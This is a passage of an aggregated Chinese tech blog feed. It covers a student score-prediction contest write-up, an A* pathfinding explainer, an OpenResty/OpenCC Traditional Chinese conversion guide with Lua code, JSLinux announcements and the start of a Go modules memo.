title="基础特征"></a>基础特征</h3><p>基础的特征工程比较简单，就是做一下统计特征，比如考试次序，考试的知识点数量和知识点跨度。将知识点映射为其所属段落和类别，又可以构造数量和跨度特征。每个知识点有难度属性，每门考试的知识点占比乘以对于难度，得到衡量考试整体难度的特征。在数据分析中提到，知识点维度巨大且稀疏，假如使用原始01向量代表知识点的分布，会大大降低模型的效率。所以我们使用经典的PCA进行降维，在实际操作中，对考试的知识点占比，知识点种类和段落占比分别降维到60维。当然我们也尝试过使用 deepwalk 之类的 embedding 方法进行降维，但效果不行，在决赛答辩阶段，听其他队伍介绍也使用了 deepwalk， 但当评委问起 embedding 效果时，也回答效果不好。此外还简单使用了交叉特征，如知识点数量和考试难度拼接交叉。</p><h3 id="相似考试特征"><a href="#相似考试特征" class="headerlink" title="相似考试特征"></a>相似考试特征</h3><p>在构造特征的时候，我们认为一个学生面对一门新考试，其成绩应该与和这次考试相似的考试成绩相近。所以我们找出每门考试最相似的三门考试，然后对学生三门考试成绩与考试相似度进行加权求和，得到预估的本次考试成绩，作为一个伪标签。在定义相似时，我们采用了三个指标：知识点分布相似，知识点段落分布相似，知识点类别分布相似。</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/education_2.png" alt="相似考试特征构造示意图" title="">                </div>                <div class="image-caption">相似考试特征构造示意图</div>            </figure></div><h3 id="五折交叉标签统计特征"><a href="#五折交叉标签统计特征" class="headerlink" title="五折交叉标签统计特征"></a>五折交叉标签统计特征</h3><p>在接触这个比赛之前，我一直认为特征是特征，标签是标签，标签信息是无法使用或丢给模型学习的。这一点本质没错，因为直接使用标签进行学习，必然造成数据泄露，得到一个毫无意义的模型。但只要稍加变通，就能充分使用标签信息。换句话说，我们在评估一个学生的成绩好坏时，常常会说这个学生的平均成绩如何如何，这个时候不也是用了标签信息吗？甚至我们可以因此推断，学生的考试平均成绩，因为是一个强特征，它对预测学生考试成绩时十分重要。因此引入了特征工程中一个比较重要的构造方式，target encode，其在 ctr 类型的比赛中使用广泛。刚刚我们说过，一方面平均成绩很重要，但另一方面引入标签信息会泄露。泄露的本质就是在为样本构造特征的时候，使用了本样本的标签信息，那么为了避免泄露，我们在 target encode 时，只要避免使用本次样本的标签信息就可以了，常见的做法为五折交叉统计，将历史考试成绩数据分为五折，每次用4折构造特征，给训练集中的另外1折。</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/education_3.jpg" alt="五折交叉统计(引用自鱼佬知乎专栏)" title="">                </div>                <div class="image-caption">五折交叉统计(引用自鱼佬知乎专栏)</div>            </figure></div><p>以此类推，我们不仅可以构造成绩平均值，还可以借助五折框架构造更多关于成绩的统计特征。<br>将构造过程分为对象和统计方法两部分：<br>对象:</p><ul><li>学生所有考试成绩</li><li>学生所有考试排名</li><li>学生考试成绩 / 本次考试平均分</li><li>学生在所有考试上表现出来的抗压能力</li><li>学生在某门课考试上表现出来的抗压能力</li><li>某门课程的所有考试成绩</li><li>学生在某门课程上的考试成绩</li><li>学生在某门课程上某次考试成绩 / 某次考试平均成绩</li><li>某性别学生在某门课程上所有考试成绩  </li></ul><p>统计方法:  </p><ul><li>最大值(max)</li><li>最小值(min)</li><li>平均值(mean)</li><li>标准差(std)</li><li>中值(median)</li><li>变异系数(cv)</li></ul><h3 id="时序特征"><a href="#时序特征" class="headerlink" title="时序特征"></a>时序特征</h3><p>学生最近几次的考试成绩可以反映一个学生最近的学习状态，所以我们可以用最近几次的考试成绩构造时序特征。差分，窗口是时序常用的方法。</p><ul><li>最近三次考试成绩 mean std</li><li>最近三次考试排名 mean std</li><li>最近三次考试成绩差值的平均</li><li>对最近三次考试成绩平均分做窗口为8的平均</li><li>对最近三次考试成绩平均分差值做窗口为3的平均</li><li>最近三次考试成绩</li></ul><h3 id="“嫁接”特征"><a href="#“嫁接”特征" class="headerlink" title="“嫁接”特征"></a>“嫁接”特征</h3><p>“嫁接”学习源于这样一个问题：初赛复赛数据分布不一致。在IJCAL2018比赛中,大家发现前六天和最后一天数据分布不同，大部分人于是用同分布的第七天上半天的数据预测下半天，而植物大佬在这个基础用前六天训练了一个模型，预测第七天得到的 probability 作为第七天模型的 feature ，再用第七天上半天的数据预测下半天，使最后的分数遥遥领先，轻松得到 solo 冠军。套用到这个比赛，复赛利用初中 4 年中的相关考试和考点信息，预测初中最后一学期最后一次考试的的成绩。我们可以认为前三年的考试和最后一年的考试是不同分布，而要预测的最后一次考试和最后一年的考试是同分布的，所以我们利用前三年数据构造部分特征，预测最后一年的考试成绩。利用全量数据构造的特征加上预测的最后一年的考试成绩预测最后一次考试成绩。</p><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>本方案采用五折交叉验证框架，分别训练 lightgbm 和 xgboost 模型，将两个模型的预测分数根据线上模型得分加权融合。模型分数见下表。</p><table><thead><tr><th align="center">模型</th><th align="center">Public分数</th></tr></thead><tbody><tr><td align="center">xgboost</td><td align="center">7.289815178</td></tr><tr><td align="center">lightgbm</td><td align="center">7.288464145</td></tr><tr><td align="center">融合</td><td align="center">7.286831301</td></tr></tbody></table><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>赛后拜读了第一大佬的开源。第一名方案对特征分别建模训练，总共分为三部分模型：第一部分模型将成绩预测问题视为回归问题进行分析，第二部分模型将成绩预测问题视为一种短期时间序列预测的问题，第三部分模型对成绩、试卷考点分布、学生考点掌握整体进行数学抽象。在第一部分模型当中，处理考试的知识点特征的时候，采用 NMF 算法进行降维处理。最让我感兴趣的是第三部分模型，在我的方案中，其实对知识点处理的不是很好，无法构造出学生对知识点的掌握情况。第一名方案采用这样一种假设：试卷-考点分布矩阵（exam）乘以学生-考点掌握矩阵（stu）就能得到试卷-学生成绩矩阵（score）。exam 矩阵和 score 矩阵都是已知，所以直接采用优化算法解得 stu 矩阵即可。形式化表示如下：</p><ul><li>score : m * n (exam_number * student_numbers) 试卷-学生成绩矩阵</li><li>exam : m * s(exam_number * course_section) 试卷-考点分布矩阵</li><li>stu : s * n (course_section * student_numbers) 学生-考点掌握矩阵</li></ul><p>其中，m 为各科考试次数，n 为学生数目 s 为各科考点数，目标函数为 <strong>Argmin (Σ(score - exam * stu)^2)</strong>。<br>最后通过学生-考点掌握矩阵乘以要预测的考试知识点分布矩阵，从而得到待预测考试的预测成绩。从模型效果来看，该部分方案十分优秀，线上得分7.33，令人佩服。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/69351598" target="_blank" rel="noopener">2019腾讯广告算法大赛方案分享（初赛冠军）</a></li><li><a href="https://zhuanlan.zhihu.com/p/51901122" target="_blank" rel="noopener">结构化数据的迁移学习：嫁接学习</a></li><li><a href="https://github.com/yzh1994414/Tianyicup-IntelligentEducation" target="_blank" rel="noopener">第一名方案</a></li></ul>]]></content>
        <author>
            <name><![CDATA[LogicJake’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2019/12/28/A_star/</id>
        <title><![CDATA[A*算法理解及代码实现]]></title>
        <updated>2020-03-04T09:15:52+08:00</updated>
        <link href="https://www.logicjake.xyz/2019/12/28/A_star/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2019/12/28/A_star/"><![CDATA[<p>A*寻路算法要解决的问题就是在有障碍物的情况下，如何快速找到一条到达目的节点的最短路径。</p><p>把问题抽象成以下场景：在一个由M×N的方块组成的区域中，绿色代表起始点，蓝色代表无法越过的障碍物，红色代表终点。需要注意的是，我们在寻路的时候无法越过“墙角”，对照到下图就是不能走红色路线，必须走蓝色路线。这是因为在抽象场景下，移动物体是无体积所以可以直接沿着红线穿过去，但在实际情况下，比如无人车寻路，考虑到体积因素是无法行进红色路线的，所以在建模的时候需要加上这样的约束条件。当然在不涉及到墙角的情况下是可以走斜线的，这是毋庸置疑的。</p><a id="more"></a><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/a_star1.jpg" alt="不能直接越过墙角" title="">                </div>                <div class="image-caption">不能直接越过墙角</div>            </figure></div><h1 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h1><p>首先定义open list和close list，open list存放已知但还没有探索过的区块，close list存放已经探索过的区块。</p><p>最短路径肯定涉及到距离度量，在A*算法中距离分为两个部分：G 和H，总距离F=G + H。</p><p>G等于从起点移动到指定方格的移动代价。在本例中，相邻节点间，横向和纵向的移动代价为 10 ，对角线的移动代价为 14 （10×根号2的近似）。为了方便计算和寻路，我们为每个节点设置一个父节点。父节点可以这样理解，在目前已知条件下，存在一条从起点到当前指定方格的最优路径，而父亲节点就是这条路径上的指定方格的上一个节点，计算当前方格的 G 值的方法就是找出其父亲的 G 值，然后按在父亲节点直线方向还是斜线方向加上 10 或 14。</p><p>H为从当前节点到终点的估计距离，是对剩余距离的估算值，而不是实际值。它是一种理想值，忽略了障碍物的影响。在本例中使用曼哈顿距离（街区距离）来度量剩余距离。</p><p>整个算法流程为：</p><ul><li>把起点加入open list，重复以下流程<ul><li>如果open list为空，寻路失败，找不到到达终点的路径。遍历 open list ，查找 F 值最小的节点，把它作为当前要处理的节点。</li><li>把这个节点移到 close list</li><li>对当前方格的 8 个相邻方格的每一个方格<ul><li>如果它是不可抵达的或者它在 close list 中，忽略。</li><li>如果它不在 open list 中，把它加入 open list ，并且把当前方格设置为它的父亲，计算该方格的 F ， G 和 H 值。</li><li>如果它已经在 open list 中，检查通过当前方格到达该方格是否代价更小，即G值更小。如果是这样，把它的父亲设置为当前方格，并重新计算它的 G 和 F 值。</li></ul></li></ul></li><li>如果终点加入到了open list中，此时路径已经找到，从终点开始，每个方格沿着父节点移动直至起点，这就是最优路径。</li></ul><p>由算法可以看出通过总距离F选出当前处理节点，通过G来更新路径（改变节点的父节点就是改变了路径）。</p><p>另外需要注意：在寻找F值最小的时候可能会出现不止一个节点的情况，此时处于节省寻路时间的考虑，选择最后放入open list的节点。因为最后放入open list的节点是上一个处理节点的邻居节点，从而保证寻路时的连贯性，不会出现在寻路过程中突然跳到另外的地方重新开辟一条新路径。</p><h1 id="流程解释"><a href="#流程解释" class="headerlink" title="流程解释"></a>流程解释</h1><p>解释流程前，先说明图例：</p><ul><li>绿色填充方块：起点</li><li>蓝色填充方块：障碍</li><li>红色填充方块：终点</li><li>绿色边的方块：open list中的方块</li><li>黄色边框方块：close list中的方块</li><li>方块中白色箭头指向父亲节点</li><li>方块中左上角数字代表F值，左下角G值，右下角H值*</li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/a_star2.jpg" alt="第1次搜索" title="">                </div>                <div class="image-caption">第1次搜索</div>            </figure><h2 id="开始搜索"><a href="#开始搜索" class="headerlink" title="开始搜索"></a>开始搜索</h2><p>从open list中取出起始点，将起点加入close list。起点周围8个方格都可到达所以都加入到open list中，设置父节点为起点，并计算各自的F，G，H值。结果如上图所示。</p><h2 id="继续搜索"><a href="#继续搜索" class="headerlink" title="继续搜索"></a>继续搜索</h2><p>从open list中找出F值最小的方格，起点右边的方格F值为40最小，暂且称该节点为A。将A从open list剔除，加入到close list。A右边为障碍物，忽略；其余方向的方格都已经在open list中且加入A并没有减小他们的G值，所以维持原样不变。</p><p>结果如下图所示，可见起点右边的方格加上了黄色框，代表进入close list，其余不变。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/a_star3.jpg" alt="第2次搜索结果" title="">                </div>                <div class="image-caption">第2次搜索结果</div>            </figure><p>重复以上步骤，值得注意的是在第5次搜索，随着起点正下方方格（称其为B）加入到close list，处于B下方的方格（称其为C）因为B的加入，起点到C的距离缩短到80，所以C的父节点跟新为B，并相应跟新F，G，H的值。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/a_star4.jpg" alt="第4次搜索结果" title="">                </div>                <div class="image-caption">第4次搜索结果</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/a_star5.jpg" alt="第5次搜索结果" title="">                </div>                <div class="image-caption">第5次搜索结果</div>            </figure><p>不断重复上述步骤，最后终点被加入到open list中，从终点开始，每个方格沿着父节点移动直至起点，就是最优路径。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/a_star6.jpg" alt="最终结果" title="">                </div>                <div class="image-caption">最终结果</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/a_star7.webp" alt="全部过程" title="">                </div>                <div class="image-caption">全部过程</div>            </figure><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><p><a href="https://github.com/LogicJake/A-star-search" target="_blank" rel="noopener">https://github.com/LogicJake/A-star-search</a></p>]]></content>
        <author>
            <name><![CDATA[LogicJake’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/support-traditional-chinese-using-openresty-and-opencc.html</id>
        <title><![CDATA[用 OpenResty+OpenCC 让网站支持正体中文]]></title>
        <updated>2020-02-29T12:30:00+08:00</updated>
        <link href="https://blog.rexskz.info/support-traditional-chinese-using-openresty-and-opencc.html"/>
        <content type="text/html" src="https://blog.rexskz.info/support-traditional-chinese-using-openresty-and-opencc.html"><![CDATA[<blockquote><p>想要查看本站的正体中文版本，点击页脚处的“正體中文”链接即可。</p></blockquote><p>关于这篇文章的背景，真是说来话长……</p><p>大概在八年前，我去 CTSC 打了个酱油（非集训队，只是去玩的），在那几天里，我接受了许多大佬们的培训，印象比较深刻的是 <a href="https://www.byvoid.com/">BYVoid</a> 大佬，因为他在 PPT 中放了自己网站的链接，我点进去之后发现可以随意切换“简体”和“繁体”，而且似乎跟我以前见过的国际化不同，文章内容也会随着切换。当时我对 Web 开发一窍不通，所以没有能力好好研究这究竟是怎么实现的。</p><p>后来有一次机缘巧合，我看到了一个叫 <a href="https://github.com/BYVoid/OpenCC">OpenCC</a> 的项目（巧合的是，作者就是 BYVoid），这个项目可以把汉字在中国大陆、香港、台湾三种模式下互相转换，对于专用词汇和地区惯用字的转换做的相当不错，而且已经是 Linux 下非常通用的库。后来我又得知，BYVoid 的网站就是利用了 OpenCC 做的转换。</p><p>当时的我尝试用 PHP 来调用 OpenCC 的函数，但由于工作量过大（加上我菜），于是也没能实现。后来想到为什么不在 Nginx 直接调用 OpenCC 把页面转换一下再返回给浏览器呢？我查了一下，Nginx 自身虽然没有调用外部函数的功能，但 OpenResty（本质上是 Nginx+Lua）似乎可以。但是由于当时我对 Nginx 也不熟，感觉换成 OpenResty 又要踩一堆坑，于是也作罢了。</p><p>去年某一天，我将自己的网站迁移到了一个配置更好的服务器，并且全面 Docker 化（本地开发的时候也在 Docker 上，只是用了另一份配置文件而已），从 Nginx 换成 OpenResty 简直跟换衣服一样轻松；加上自我感觉现在的水平应当足够了，于是便开始了又一次的尝试。</p><p>通过一些搜索，我发现已经有人成功使用 OpenResty 提供的 Lua FFI 调用了 OpenCC 的 <code>.so</code> 库，但由于是给付费客户做的，因此不方便公开源码。虽然有点遗憾，但我觉得，既然有了一个可行的思路，那我一定能搞出来。</p><h1>在 Docker 中搭建 OpenResty+OpenCC</h1><p>这应当是全文最容易理解的部分了。简而言之，要想达成目标，我们首先需要有一个 OpenResty 和 OpenCC。经过搜索，我找到了 <a href="https://github.com/hustshawn/openresty-opencc-docker">hustshawn/openresty-opencc-docker</a> 这个项目。</p><p>看起来它的 Dockerfile 没什么问题，只是 OpenResty 的版本稍微旧了一些，于是我 Fork 了一份、改了一下版本后，打成了自己的一个 Docker 镜像 <a href="https://hub.docker.com/r/rexskz/openresty-opencc-docker">rexskz/openresty-opencc-docker</a>。要想启动起来，只需要在 <code>compose.yml</code> 中这样写（之所以 <code>name</code> 还叫 <code>nginx</code>，因为它本质上就是个 Nginx，就好比 MariaDB 的可执行程序依旧叫 <code>mysql</code>）：</p><pre><code class="lang-yaml">services:
  nginx:
    image: rexskz/openresty-opencc-docker
    container_name: nginx
    hostname: nginx
    # ....省略其它的配置</code></pre><p>启动容器后进去转了一圈，发现 OpenCC 相关的所有数据文件都在 <code>/usr/share/opencc/</code> 目录下，由于我想把简体中文转换为台湾的正体中文，并需要转换专用词汇和地区惯用字，因此需要加载其中的 <code>s2twp.json</code> 文件。</p><h1>了解 OpenResty 的一些基础知识</h1><p>OpenResty 之所以可以做到许多事情，因为它内置了一个 LuaJIT，可以使用 Lua 这个脚本语言来自定义处理逻辑，例如 CloudFlare 就用它来做 WAF。我们这次的目标很单纯——如果发现有 <code>cc_lang=zh_TW</code> 这个 Cookie，就将 Response 中的汉字转换为台湾的正体中文。</p><p>经过查阅 OpenResty 的文档，我发现有两个指令可以满足我的需求：<code>body_filter_by_lua_block</code> 和 <code>body_filter_by_lua_file</code>（至于 <code>body_filter_by_lua</code>，文档说已经不推荐使用了），前者是直接将 Lua 代码写到 Nginx 配置文件中，后者是写到特定的 Lua 文件中。我选择了后者，因为后者在开发环境中会更好用一些：可以在 Nginx 配置文件中添加 <code>lua_code_cache off</code> 指令，每次修改了 Lua 文件后无需 <code>nginx -s reload</code>。</p><h1>了解 OpenResty 的 Lua 文件</h1><p>OpenResty 之所以可以调用 Lua 来修改请求和响应，是因为在 LuaJIT 中，可以通过一个叫 <code>ngx</code> 的全局变量来获取 Nginx 的数据或者与 Nginx 互动，例如在 <code>body_filter_by_lua</code> 中加载的 Lua 脚本：</p><ul><li>可以用 <code>ngx.arg[1]</code> 获取 Nginx 的 Response body；</li><li>可以用 <code>ngx.var['cookie_cc_lang']</code> 获取名为 <code>cc_lang</code> 的 Cookie 值；</li><li>可以用 <code>ngx.log(ngx.NOTICE, &quot;xxx&quot;)</code> 往 Nginx 的 Notice 级别的 Log 中输出一句话。</li></ul><p>完整的 <code>ngx</code> API 在这里：<a href="https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/">Lua Ngx API - OpenResty Reference</a>。</p><p>至于 Lua 的 FFI，看了文档之后也发现是相当简单，只需要如下几步：</p><ol><li><code>require('ffi')</code>（废话）；</li><li>定义函数签名，用的是 C 的语法；</li><li>通过一条命令加载动态链接库；</li><li>直接跟 JavaScript 一样调用即可。</li></ol><p>要想完成本文的目标，只需看 <a href="https://moonbingbing.gitbooks.io/openresty-best-practices/lua/FFI.html">FFI · OpenResty最佳实践</a> 这一个页面就足够了。</p><h1>了解 OpenCC 的 C API</h1><p>所有可以通过 FFI 调用的 C API 在这里：<a href="http://byvoid.github.io/OpenCC/1.0.4/group__opencc__c__api.html">Open Chinese Convert: OpenCC C API</a>，只有非常少的几个函数，通过描述我们大概可以得出调用顺序：</p><pre><code class="lang-c">opencc_t inst = opencc_open(&quot;/usr/share/opencc/s2twp.json&quot;);

// 文字是 utf8 编码
char *input = &quot;这是一段文字&quot;;
char *output = opencc_convert_utf8(inst, input, strlen(input));

// 当然也可以用这一种思路：即提前分配好 output 的空间
// char *output = (char *)malloc(sizeof(char) * strlen(input) + 1);
// opencc_convert_utf8_to_buffer(inst, input, strlen(input), output);

// 想办法把 output 保存起来
....

// 最后需要做一些清理，否则可能会内存泄漏
opencc_convert_utf8_free(output);
opencc_close(inst);</code></pre><h1>开始正式的实践</h1><p>理清思路之后，我们就可以开始写了！首先新建一个 <code>nginx-opencc-filter.lua</code> 的文件，并将其挂载到 OpenResty 容器中：</p><pre><code class="lang-yaml">services:
  nginx:
    volumes:
      # 这是我网站的配置文件
      - ./nginx-docker-live.conf:/path/to/rexskz.conf
      # 这是刚刚新建的 .lua 文件
      - ./nginx-opencc-filter.lua:/path/to/opencc-filter.lua
    # ....省略其它的配置</code></pre><p>然后在 OpenResty 配置文件中加载这个 Lua 文件：</p><pre><code class="lang-nginx"># 只为你需要转换的页面添加这个配置，不要所有的 location 都加
location /your-page {
    body_filter_by_lua_file /path/to/opencc-filter.lua;
    # ....省略其它的配置
}</code></pre><p>接下来开始写 Lua 脚本了！至于 Lua 的简单语法，网上有很多，这儿就不赘述了。整个脚本是这样的，基本的思路跟刚才写的 C 代码差不多，应当非常好理解：</p><pre><code class="lang-lua">local cookie_value = ngx.var['cookie_cc_lang']

if cookie_value == 'zh_TW' then
    local ffi = require('ffi')

    ffi.cdef[[
        typedef void* opencc_t;

        opencc_t opencc_open(const char *configFileName);
        int      opencc_close(opencc_t opencc);
        char*    opencc_convert_utf8(opencc_t opencc, const char *input, size_t length);
        void     opencc_convert_utf8_free(char *str);
    ]]

    local cc = ffi.load('opencc')

    local inst = cc.opencc_open('/usr/share/opencc/s2twp.json')
    local input = ngx.arg[1]
    local res = cc.opencc_convert_utf8(inst, input, #input)

    ngx.arg[1] = ffi.string(res)

    cc.opencc_convert_utf8_free(res)
    cc.opencc_close(inst)
end</code></pre><p>添加了 Cookie 之后刷新一下，发现页面已经是正体中文版本了！之后的操作就是在页面中适当的地方加上简体中文和正体中文的链接。</p><h1>由于 Buffer 导致的 Bug</h1><p>奇怪的是，不是所有的页面都可以成功转换，有些页面进去之后只能加载很少的一部分文本，甚至有的页面直接提示 <code>ERR_INCOMPLETE_CHUNKED_ENCODING</code>。回去看 Nginx 的 Log，发现只要一访问这样的页面，就会多一句 <code>worker process 8 exited on signal 11</code>，我看了半天，感觉 Lua 脚本不应该有 Bug，但 OpenResty 的 Lua 脚本又不方便单步调试，于是我祭出了八年前就熟练掌握的输出调试大法，在一开始先输出 <code>ngx.arg[1]</code>，保存刷新，于是发现了一堆 UTF-8 下面的乱码……没错，就是黑色菱形里面带一个问号的那种。</p><p>一次正常的请求，会输出一次或多次，每一次都没有这样的乱码；但对于不正常的请求，一定会在最后一次输出这样的乱码，然后 Worker process 就崩溃了。经验告诉我，一定是因为 Nginx 为了加快速度，对请求做了流式处理，将请求和响应切分成若干个 Chunk 发送给了 Lua 脚本。一旦切分的位置恰好在一个汉字（占 3 个字节）的中间，那么这个汉字就会被切分成两个乱码，被分散到了两个 Chunk 中。</p><p>OpenCC 不需要对这种特殊情况做兼容，而且即使做了兼容，也无法转换这个字（甚至这个字所在的词语），因此我们能做的就是让 Nginx 不切分页面的 Response body。由于我的网站是 FastCGI + PHP-FPM（上古时期的技术了），因此只需要调大一下 Buffer 的值即可（直接设置 <code>fastcgi_buffering off</code> 我试了似乎没用，不知道为什么）：</p><pre><code class="lang-nginx">fastcgi_buffers           8 256k;
fastcgi_buffer_size       256k;
fastcgi_busy_buffers_size 512k;</code></pre><p>对于使用 <code>proxy_pass</code> 代理的情况，有等价的 <code>proxy_buffer_size</code> 等指令，用法完全一样。</p><p>于是……我的网站就这样支持了正体中文。</p>]]></content>
        <author>
            <name><![CDATA[R·ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.invariant.cn/try-jslinux/</id>
        <title><![CDATA[用 JSLinux 在浏览器中运行 Linux]]></title>
        <updated>2020-02-24T16:24:41+08:00</updated>
        <link href="https://blog.invariant.cn/try-jslinux/"/>
        <content type="text/html" src="https://blog.invariant.cn/try-jslinux/"><![CDATA[<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://invariant.me/try-jslinux/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Running Linux in your Browser with JSLinux</div><div class="kg-bookmark-description">Yesterday I ported the Wasm-based hardware emulator, JSLinux, to use xterm.js for frontend and my wstunnel for networking.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://invariant.me/favicon.ico" alt="用 JSLinux 在浏览器中运行 Linux"><span class="kg-bookmark-author">Heyang Zhou</span><span class="kg-bookmark-publisher">The Invariant</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://invariant.me/content/images/2020/02/Alpine_logo.png" alt="用 JSLinux 在浏览器中运行 Linux"></div></a></figure><img src="https://blog.invariant.cn/content/images/2020/03/Alpine_logo.png" alt="用 JSLinux 在浏览器中运行 Linux"><p><a href="https://bellard.org/jslinux/">JSLinux</a> 是 <a href="https://bellard.org/">Fabrice Bellard</a> 写的一个支持 32 位 x86 和 32/64 位 RISC-V 系统模拟的硬件模拟器，可编译为 WebAssembly 以在浏览器中运行。</p><p>昨天我<a href="https://github.com/losfair/jslinux-wstunnel">开了一个分支</a>，把字符终端实现换成了 <a href="https://xtermjs.org/">xterm.js</a> ，把网络实现换成了我的 <a href="https://github.com/losfair/wstunnel">wstunnel</a> 。这里是一个在修改后的 JSLinux 上运行 Alpine Linux 的 x86 虚拟机，可以在线试用。请不要滥用网络 :)</p><!--kg-card-begin: html--><iframe style="width: 100%; height: 500px" src="https://jslinux.invariant.me/widget.html">&lt;iframe disabled?&gt;</iframe><!--kg-card-end: html-->]]></content>
        <author>
            <name><![CDATA[The Invariant 中文]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/try-jslinux/</id>
        <title><![CDATA[Running Linux in your Browser with JSLinux]]></title>
        <updated>2020-02-24T16:16:18+08:00</updated>
        <link href="https://invariant.me/try-jslinux/"/>
        <content type="text/html" src="https://invariant.me/try-jslinux/"><![CDATA[<img src="https://invariant.me/content/images/2020/02/Alpine_logo.png" alt="Running Linux in your Browser with JSLinux"><p><a href="https://bellard.org/jslinux/">JSLinux</a> is an awesome emulator by <a href="https://bellard.org/">Fabrice Bellard</a> that implements full 32-bit x86 and RV32/RV64 RISC-V systems in the browser using WebAssembly.</p><p>Yesterday I <a href="https://github.com/losfair/jslinux-wstunnel">ported</a> JSLinux to use <a href="https://xtermjs.org/">xterm.js</a> for frontend and my <a href="https://github.com/losfair/wstunnel">wstunnel</a> for networking. Below is a live x86 virtual machine running Alpine Linux. Feel free to try it here (but please do not abuse the network interface) !</p><!--kg-card-begin: html--><iframe style="width: 100%; height: 500px" src="https://jslinux.invariant.me/widget.html">&lt;iframe disabled?&gt;</iframe><!--kg-card-end: html--><p></p>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/go-module-memo.html</id>
        <title><![CDATA[Go module 踩坑备忘]]></title>
        <updated>2020-02-16T09:25:24+08:00</updated>
        <link href="https://blog.rexskz.info/go-module-memo.html"/>
        <content type="text/html" src="https://blog.rexskz.info/go-module-memo.html"><![CDATA[<p>最近由于业务需求，需要新开一个 Go 的项目。听朋友说 Go 从 1.11 开始有了个叫 Modules 的新特性，于是打算看看能否用在我的新项目中。</p><p>为什么我对 Modules 这么感兴趣呢？因为写项目总是逃不开各种包管理，而之前 Go 不管是官方还是非官方的包管理器，都是基于 <code>GOPATH</code> 或者 <code>vendor</code> 目录，也无法很好的解决不同版本的冲突。Modules 据说可以解决这些问题。</p><p>我们之前的项目用的是 Go 官方的包管理器 <code>dep</code>，真是被我们吐槽了好久：</p><ul><li>它默认不显示进度，除非手动添加 <code>-v</code> 参数；</li><li>命令十分诡异，以安装为例，我见过的有：<code>npm install</code>、<code>gem install</code>、<code>pip install</code>，还有……<code>dep ensure</code>；</li><li>我无法把 Go 的项目跟其它项目放在同一个 Workspace 下面，而必须放到 <code>GOPATH</code> 下面。</li></ul><p>试用了一下 Modules，发现有这几个好处：</p><ul><li>它默认在安装时会显示进度，在国内众所周知的网络环境下可以轻松确定网络是否有问题；</li><li>它是 Go 的原生命令，使用起来跟 Go 的其它命令比较像，没有违和感；</li><li>它允许我们把 Go 项目放到任意的地方；</li><li>它有一些很棒的功能，例如生成依赖关系图、生成 vendor 文件夹、验证包的内容、解释为何需要依赖某个包。</li></ul><p>对于大部分人来说，照着网上的教程来做就可以了，我在做的时候，遇到了一些问题，于是就在这里记录一下。</p><h1>VSCode 插件</h1><p>VSCode 的插件 <code>ms-vscode.go</code> 已经可以完美支持 Go Modules 了，更新到最新版即可。由于我还有项目需要使用 <code>dep</code>，因此我在 <code>settings.json</code> 里面新增了这些：</p><pre><code class="lang-json">{
    &quot;go.toolsEnvVars&quot;: {
        &quot;GO111MODULE&quot;: &quot;auto&quot;
    },
}</code></pre><p>环境变量 <code>GO111MODULE</code> 的取值有三个：<code>off</code> 表示强行使用 <code>GOPATH</code> 的方法（适用于 <code>dep</code>），<code>on</code> 表示强行使用 Modules，<code>auto</code> 表示如果发现你的项目在 <code>GOPATH</code> 那么就用传统方法（即使有了 <code>go.mod</code> 文件），否则就用 Modules。</p><h1>报错 no package for import "fmt"</h1><p>这种错误就比较奇葩了，我相信很多人都遇到过找不到其它包的情况，但我这儿连 <code>fmt</code> 都找不到……</p><p>搜了一下，这是 <code>gopls</code> 的报错，于是用 <code>gopls -rpc.trace -v check file.go</code> 看了一下，发现由于我项目文件的问题，报错 <code>initial workspace load failed</code>，这个 Workspace 里面应当包含 <code>./...</code> 和 <code>builtin</code>，<code>fmt</code> 属于后者，因此也跟着找不到了。</p><p>那么该如何在项目中引用项目本身的包呢？例如我的项目叫 <code>myproj</code>，我要在 <code>cmd/main.go</code> 里面依赖 <code>cmd/server</code> 包。</p><p>通过搜索，我得知可以在 <code>go.mod</code> 里面配置一行 <code>replace myproj =&gt; ./</code>，整个文件如下：</p><pre><code>module myproj

replace myproj =&gt; ./

go 1.13

require (
    ....
)</code></pre><p>之后的引用就可以这样写了：</p><pre><code class="lang-go">import (
    &quot;myproj/cmd/server&quot;
